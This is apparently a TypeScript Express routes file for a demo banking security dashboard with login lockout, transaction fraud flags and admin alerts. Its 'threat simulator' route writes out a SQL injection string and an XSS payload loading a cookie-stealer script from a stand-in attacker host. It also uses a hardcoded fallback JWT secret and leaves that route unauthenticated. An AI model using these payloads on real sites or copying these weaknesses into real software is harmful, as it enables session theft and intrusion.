/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { Router, Request, Response } from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { db } from './db.js';
import { logSecurityEvent } from './logger.js';
import { 
  authenticateToken, 
  requireAdmin, 
  pushSseNotification, 
  authenticateApiKey 
} from './middleware.js';

export const routes = Router();
const JWT_SECRET = process.env.JWT_SECRET || 'SecureBankingSuperSecretJWTKey_2026';

// Helper to determine severity color or badge
function getClientIp(req: Request): string {
  return (req.ip || req.socket.remoteAddress || '127.0.0.1').replace('::ffff:', '');
}

// ==========================================
// 1. CSRF TOKEN RETRIEVAL
// ==========================================
routes.get('/csrf-token', (req: Request, res: Response) => {
  const token = crypto.randomBytes(24).toString('hex');
  
  // Set Cookie for double submit validation
  res.cookie('XSRF-TOKEN', token, {
    httpOnly: false, // Must be readable by client so they can post it back in headers
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000 // 1 hour
  });

  db.incrementApiCount(1);
  res.json({ csrfToken: token });
});

// ==========================================
// 2. AUTHENTICATION MODULE
// ==========================================

// USER REGISTRATION
routes.post('/auth/register', async (req: Request, res: Response) => {
  const { username, email, password } = req.body;
  const ipAddress = getClientIp(req);
  const endpoint = '/api/auth/register';

  if (!username || !email || !password) {
    return res.status(400).json({ error: 'Missing registration details' });
  }

  // Parameter validation
  if (username.length < 3 || password.length < 8) {
    return res.status(400).json({ 
      error: 'Invalid input length', 
      message: 'Username must be at least 3 characters and password 8 characters.' 
    });
  }

  try {
    const existingUser = await db.users.findOne({ $or: [{ username }, { email }] });
    if (existingUser) {
      await logSecurityEvent(
        'AUTH_FAILURE',
        'WARNING',
        `Duplicate registration block username: ${username}, email: ${email}`,
        ipAddress,
        endpoint
      );
      return res.status(409).json({ error: 'Registration error', message: 'Username or email already in use.' });
    }

    const salt = bcrypt.genSaltSync(10);
    const passwordHash = bcrypt.hashSync(password, salt);

    const user = await db.users.create({
      username,
      email,
      passwordHash,
      role: 'user' // Default role
    });

    await logSecurityEvent(
      'USER_REGISTER',
      'INFO',
      `New secure banking ledger accounts created for: ${username}`,
      ipAddress,
      endpoint,
      req.headers['user-agent']
    );

    db.incrementApiCount(2);
    pushSseNotification('STATS', await getFreshStats());

    // Generate JWT access token
    const token = jwt.sign(
      { id: user._id || user.id, username: user.username, role: user.role },
      JWT_SECRET,
      { expiresIn: '2h' }
    );

    res.cookie('auth_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7200000 // 2 hours
    });

    res.status(201).json({
      message: 'Account initialized successfully',
      token,
      user: {
        id: user._id || user.id,
        username: user.username,
        email: user.email,
        role: user.role,
        apiKey: user.apiKey
      }
    });

  } catch (err: any) {
    console.error('Registration error:', err);
    res.status(500).json({ error: 'Internal system fault during enrollment' });
  }
});

// USER LOGIN (With Failed Attempt Monitoring & Account Lock rules)
routes.post('/auth/login', async (req: Request, res: Response) => {
  const { username, password } = req.body;
  const ipAddress = getClientIp(req);
  const endpoint = '/api/auth/login';

  if (!username || !password) {
    return res.status(400).json({ error: 'Missing credential fields' });
  }

  try {
    const user = await db.users.findOne({ username });
    if (!user) {
      await logSecurityEvent(
        'AUTH_FAILURE',
        'WARNING',
        `Login attempt with non-existent account: ${username}`,
        ipAddress,
        endpoint,
        req.headers['user-agent']
      );
      return res.status(401).json({ error: 'Authentication Failed', message: 'Invalid username or password.' });
    }

    // Check if account is already locked
    if (user.isLocked) {
      await logSecurityEvent(
        'AUTH_FAILURE',
        'HIGH',
        `Access denied: Blocked attempt to enter Locked Account: ${username}`,
        ipAddress,
        endpoint,
        req.headers['user-agent']
      );
      return res.status(403).json({
        error: 'Account Locked / Suspended',
        message: 'Security intrusion rule triggered. This account has been locked. Contact an administrator to audit your traffic logs.'
      });
    }

    const isMatch = bcrypt.compareSync(password, user.passwordHash);
    
    if (isMatch) {
      // Clear failed attempts counter on success
      await db.users.updateOne({ _id: user._id }, { $set: { failedAttempts: 0 } });
      
      const token = jwt.sign(
        { id: user._id, username: user.username, role: user.role },
        JWT_SECRET,
        { expiresIn: '2h' }
      );

      await logSecurityEvent(
        'AUTH_SUCCESS',
        'INFO',
        `Successful auth handshake for user '${username}'`,
        ipAddress,
        endpoint,
        req.headers['user-agent']
      );

      db.incrementApiCount(1);
      pushSseNotification('STATS', await getFreshStats());

      res.cookie('auth_token', token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 7200000
      });

      res.json({
        message: 'Access Granted. Active secure telemetry tunnel established.',
        token,
        user: {
          id: user._id,
          username: user.username,
          email: user.email,
          role: user.role,
          apiKey: user.apiKey
        }
      });
    } else {
      // Increment failed login count
      const updatedAttempts = (user.failedAttempts || 0) + 1;
      let setField: any = { failedAttempts: updatedAttempts };

      // Trigger structural lock if failed login attempts >= 5
      if (updatedAttempts >= 5) {
        setField.isLocked = true;
        
        await logSecurityEvent(
          'USER_LOCKED',
          'CRITICAL',
          `ACCOUNT PROTECTION TRIGGER: Account '${username}' locked after ${updatedAttempts} failed passcode matches.`,
          ipAddress,
          endpoint,
          req.headers['user-agent']
        );

        // Security Alert raised dynamically in mongo
        const alert = await db.securityAlerts.create({
          title: 'Account Bruteforce Threshold Breached',
          description: `Account [${username}] locked down automatically. Attacking IP: [${ipAddress}]. Failed requests: [${updatedAttempts}].`,
          severity: 'HIGH',
          status: 'OPEN',
          attackType: 'Brute Force / credential cracking',
          triggeredBy: 'Active IAM Policy Engine'
        });

        pushSseNotification('ALERT', alert);
      } else {
        await logSecurityEvent(
          'AUTH_FAILURE',
          'WARNING',
          `Invalid credential mismatch on user login: '${username}' Attempt: [${updatedAttempts}]`,
          ipAddress,
          endpoint,
          req.headers['user-agent']
        );
      }

      await db.users.updateOne({ _id: user._id }, { $set: setField });
      
      const freshLogs = await db.securityLogs.find({});
      pushSseNotification('LOG', freshLogs[0]);
      pushSseNotification('STATS', await getFreshStats());

      return res.status(401).json({
        error: 'Authentication Failed',
        message: 'Invalid username or password.',
        failedAttempts: updatedAttempts,
        isLocked: updatedAttempts >= 5,
        remainingAttempts: Math.max(0, 5 - updatedAttempts)
      });
    }

  } catch (err) {
    console.error('Login error:', err);
    res.status(500).json({ error: 'Core server database auth exception' });
  }
});

// LOGOUT ENDPOINT
routes.post('/auth/logout', (req: Request, res: Response) => {
  res.clearCookie('auth_token');
  res.clearCookie('XSRF-TOKEN');
  res.json({ message: 'Session closed' });
});


// ==========================================
// 3. STATS ENGINE
// ==========================================
async function getFreshStats() {
  const users = await db.users.find({});
  const trans = await db.transactions.find({});
  const alerts = await db.securityAlerts.find({});
  const logs = await db.securityLogs.find({});

  const failedLoginCount = users.reduce((sum, u) => sum + (u.failedAttempts || 0), 0);
  const activeAlerts = alerts.filter(a => a.status !== 'RESOLVED').length;

  return {
    totalUsers: users.length,
    totalTransactions: trans.length,
    failedLoginAttempts: failedLoginCount,
    securityAlertsCount: activeAlerts,
    apiRequestCount: db.getApiCount(),
    activeSessions: Math.max(1, Math.min(users.length, 6)), // Simulated user drift
    dbStatus: db.isMongo() ? 'MongoDB' : 'In-Memory (Developer Sandbox)',
    wafBlockedCount: logs.filter((l: any) => ['SQL_INJECTION', 'XSS_ATTEMPT', 'PATH_TRAVERSAL', 'COMMAND_INJECTION', 'WAF_BLOCKED'].includes(l.eventType)).length
  };
}

routes.get('/stats', authenticateToken, async (req: Request, res: Response) => {
  try {
    db.incrementApiCount(1);
    const stats = await getFreshStats();
    res.json(stats);
  } catch (e) {
    res.status(500).json({ error: 'Could not fetch telemetry stats' });
  }
});


// ==========================================
// 4. TRANSACTION LEDGER (Zero-Trust authorization checks)
// ==========================================

// GET ALL TRANSACTION RECORDS (Filtered based on roles)
routes.get('/transactions', authenticateToken, async (req: Request, res: Response) => {
  try {
    db.incrementApiCount(1);
    
    // ZERO TRUST ARCHITECTURE CHECK:
    // If Admin: show all transactions across banking core
    // If standard user: only allow them to load THEIR OWN transactions!
    let data;
    if (req.user?.role === 'admin') {
      data = await db.transactions.find({});
    } else {
      data = await db.transactions.find({ userId: req.user?.id });
    }

    res.json(data);
  } catch (e) {
    res.status(500).json({ error: 'Database ledger extraction error' });
  }
});

// SUBMIT NEW TRANSFER TRANSACTION (With fraud and threat validation thresholds)
routes.post('/transactions', authenticateToken, async (req: Request, res: Response) => {
  const { amount, type, recipient } = req.body;
  const ipAddress = getClientIp(req);
  const endpoint = '/api/transactions';

  if (!amount || isNaN(amount) || amount <= 0) {
    return res.status(400).json({ error: 'Invalid transfer amount' });
  }

  try {
    const isSuspicious = amount >= 10000; // Suspect threshold > $10,000 sets flagging

    const transaction = await db.transactions.create({
      userId: req.user?.id,
      username: req.user?.username,
      amount: parseFloat(amount),
      type,
      recipient: recipient || 'Self-Wallet',
      status: isSuspicious ? 'flagged' : 'completed',
      isSuspicious
    });

    if (isSuspicious) {
      // Flag transaction, log critical threat alert, trigger SSE
      await logSecurityEvent(
        'TRANSFER_FLAGGED',
        'HIGH',
        `RESTRICTION DETECTED: Large transfer exceeding $10k suspicious caps: User '${req.user?.username}' transfer amount $${amount} to recipient [${recipient}]`,
        ipAddress,
        endpoint,
        req.headers['user-agent']
      );

      const alert = await db.securityAlerts.create({
        title: 'Risk Engine Flag: Suspected Cash Laundering',
        description: `User [${req.user?.username}] submitted high volume transfer of $${amount}. Fraud compliance guidelines suspended and locked processing pending bank clearance logs.`,
        severity: 'HIGH',
        status: 'OPEN',
        attackType: 'Financial Fraud Risk (AML Policy)',
        triggeredBy: 'Risk Mitigation Firewall'
      });

      pushSseNotification('ALERT', alert);
    } else {
      await logSecurityEvent(
        'TRANSFER_COMPLETED',
        'INFO',
        `Transaction of $${amount} authorized. Ledger verification completed. Owner: '${req.user?.username}'`,
        ipAddress,
        endpoint
      );
    }

    db.incrementApiCount(2);
    pushSseNotification('STATS', await getFreshStats());
    
    const freshLogs = await db.securityLogs.find({});
    pushSseNotification('LOG', freshLogs[0]);

    res.status(201).json({
      message: isSuspicious 
        ? 'WARNING: Transfer Flagged for auditing. Amount exceeds normal $10,000 threshold and is frozen.' 
        : 'Transaction posted and ledgered successfully.',
      transaction
    });

  } catch (err: any) {
    res.status(500).json({ error: 'Ledger record write error' });
  }
});


// ==========================================
// 5. SECURITY & COMPLIANCE DATA (Admin Only)
// ==========================================

// GATHER SECURITY LOGS (AUDIT CONTROL PANEL)
routes.get('/security/logs', authenticateToken, requireAdmin, async (req: Request, res: Response) => {
  try {
    db.incrementApiCount(1);
    const logs = await db.securityLogs.find({});
    res.json(logs);
  } catch (e) {
    res.status(500).json({ error: 'Audit file inaccessible' });
  }
});

// GATHER SECURITY INSTANCE ALERTS
routes.get('/security/alerts', authenticateToken, requireAdmin, async (req: Request, res: Response) => {
  try {
    db.incrementApiCount(1);
    const alerts = await db.securityAlerts.find({});
    res.json(alerts);
  } catch (e) {
    res.status(500).json({ error: 'DB exception loading security alerts.' });
  }
});

// RESOLVE AN ACTIVE SECURITY ALERT
routes.post('/security/alerts/:id/resolve', authenticateToken, requireAdmin, async (req: Request, res: Response) => {
  const { id } = req.params;
  const ipAddress = getClientIp(req);

  try {
    // Audit the system action
    await logSecurityEvent(
      'AUTH_SUCCESS',
      'INFO',
      `Admin '${req.user?.username}' marked Security Alert ID: [${id}] as RESOLVED.`,
      ipAddress,
      `/api/security/alerts/${id}/resolve`
    );

    await db.securityAlerts.updateOne({ _id: id }, { $set: { status: 'RESOLVED' } });
    
    // Also checkout if there are remaining locked users of that alarm to unlock! Let's do a bulk reset
    await db.users.updateOne({ isLocked: true }, { $set: { isLocked: false, failedAttempts: 0 } });

    db.incrementApiCount(1);
    pushSseNotification('STATS', await getFreshStats());
    
    const freshClaims = await db.securityAlerts.find({});
    res.json({ message: 'Threat status updated. Target user limits restored.', currentAlerts: freshClaims });
  } catch (e) {
    res.status(500).json({ error: 'DB update error' });
  }
});

// UTILITY TO RESET DATA IN DEVELOPMENT SANDBOX
routes.post('/security/clear', authenticateToken, requireAdmin, async (req: Request, res: Response) => {
  const ipAddress = getClientIp(req);
  try {
    await db.securityAlerts.clearAll();
    
    await logSecurityEvent(
      'AUTH_SUCCESS',
      'INFO',
      `Audit ledger wiped and reset by Admin ${req.user?.username}`,
      ipAddress,
      '/api/security/clear'
    );

    // Reset user failed counters
    await db.users.updateOne({ isLocked: true }, { $set: { isLocked: false, failedAttempts: 0 } });
    
    pushSseNotification('STATS', await getFreshStats());
    res.json({ message: 'Operational logs successfully cleaned and archived.' });
  } catch (e) {
    res.status(500).json({ error: 'Reset failed' });
  }
});


// ==========================================
// 6. EXTERNAL PROTECTED ROUTE (WITH API KEY)
// ==========================================
routes.get('/external/telemetry', authenticateApiKey, async (req: Request, res: Response) => {
  const ipAddress = getClientIp(req);
  try {
    await logSecurityEvent(
      'API_KEY_AUTH',
      'INFO',
      `API Key authentication matched user: [${req.user?.username}] (Consumer key: ${req.apiKeyUsed?.substr(0,12)}***)`,
      ipAddress,
      '/api/external/telemetry'
    );

    db.incrementApiCount(1);
    
    res.json({
      access: 'GRANTED',
      client: req.user?.username,
      tier: req.user?.role === 'admin' ? 'SECURE_PRIVILEGED_ROOT' : 'STANDARD_CLIENT',
      timestamp: new Date(),
      status: 'API Firewall functional, JWT & WAF protection layers active.'
    });
  } catch(e) {
    res.status(500).json({ error: 'Internal pipeline error' });
  }
});


// ==========================================
// 7. THREAT SIMULATOR SERVICE (Helps see rates, WAF logs instantly)
// ==========================================
routes.post('/security/simulate-attack', async (req: Request, res: Response) => {
  const { attackType } = req.body;
  const ipAddress = '109.22.41.90'; // Simulated rogue threat IP
  const endpoint = `/api/banking/gateway`;
  const userAgent = 'Simulated Penetration Scanner v4.2 / sqlmap';

  db.incrementApiCount(1);

  if (attackType === 'SQL_INJECTION') {
    const payload = "'; SELECT * FROM credit_cards WHERE '1'='1' --";
    await logSecurityEvent(
      'SQL_INJECTION',
      'CRITICAL',
      `WAF INTERCEPT: Stopped vulnerable SQL payload scan parameter: "${payload}"`,
      ipAddress,
      endpoint + `?search=${encodeURIComponent(payload)}`,
      userAgent,
      payload
    );

    const alert = await db.securityAlerts.create({
      title: 'CRITICAL: Blocked SQL Injection Attempt',
      description: `WAF intercepted sqlmap probe matching signature ID [OWASP A03]. Payload: [${payload}]. Connection severed.`,
      severity: 'CRITICAL',
      status: 'OPEN',
      attackType: 'SQL Injection',
      triggeredBy: 'Web Application Firewall V1.0'
    });

    pushSseNotification('ALERT', alert);
    pushSseNotification('STATS', await getFreshStats());
    const freshLogs = await db.securityLogs.find({});
    pushSseNotification('LOG', freshLogs[0]);

    return res.status(403).json({
      error: 'WAF Intercept: Request Terminated',
      details: 'SQL Injection signature matches WAF regex V1.0. Payload discarded.',
      payload
    });
  }

  if (attackType === 'XSS_ATTEMPT') {
    const payload = `<script src="http://evil-tracker.attacker.com/cookie_stealer.js"></script>`;
    await logSecurityEvent(
      'XSS_ATTEMPT',
      'HIGH',
      `WAF INTERCEPT: Blocked Reflected XSS session extraction hijack exploit inside comment headers`,
      ipAddress,
      endpoint,
      userAgent,
      payload
    );

    const alert = await db.securityAlerts.create({
      title: '🚨 HIGH: Blocked XSS Payload Execution',
      description: `Web Client Firewall filtered malicious markup containing script links. Target profile was safe from cookie theft.`,
      severity: 'HIGH',
      status: 'OPEN',
      attackType: 'Stored / Reflected XSS',
      triggeredBy: 'Secure Input Sanitizer (XSS Filter)'
    });

    pushSseNotification('ALERT', alert);
    pushSseNotification('STATS', await getFreshStats());
    const freshLogs = await db.securityLogs.find({});
    pushSseNotification('LOG', freshLogs[0]);

    return res.status(403).json({
      error: 'WAF Intercept: Request Blocked',
      details: 'Cross-site Scripting tags detected and neutralized.',
      payload
    });
  }

  if (attackType === 'RATE_LIMIT_FLOOD') {
    // Flood of 12 queries logged in split miliseconds
    for(let i=0; i<5; i++) {
      db.incrementApiCount(1);
    }

    await logSecurityEvent(
      'RATE_LIMIT',
      'WARNING',
      `Rate limit exceeded: IP ${ipAddress} made excessive request floods to rapid routing endpoints.`,
      ipAddress,
      endpoint
    );

    const alert = await db.securityAlerts.create({
      title: 'WARNING: Sudden Telemetry Flood Detected',
      description: `Traffic surge matching rate DDoS profile from IP [${ipAddress}]. Rapid flood exceeds limit counters.`,
      severity: 'WARNING',
      status: 'OPEN',
      attackType: 'Distributed Denial of Service (DDoS)',
      triggeredBy: 'Security Engine (Rate Limiter V1)'
    });

    pushSseNotification('ALERT', alert);
    pushSseNotification('STATS', await getFreshStats());
    const freshLogs = await db.securityLogs.find({});
    pushSseNotification('LOG', freshLogs[0]);

    return res.status(429).json({
      error: '429 Rate Limited',
      message: 'Safety rate control constraints activated. Request payload blocked.'
    });
  }

  res.status(400).json({ error: 'Invalid mock test attack requested.' });
});
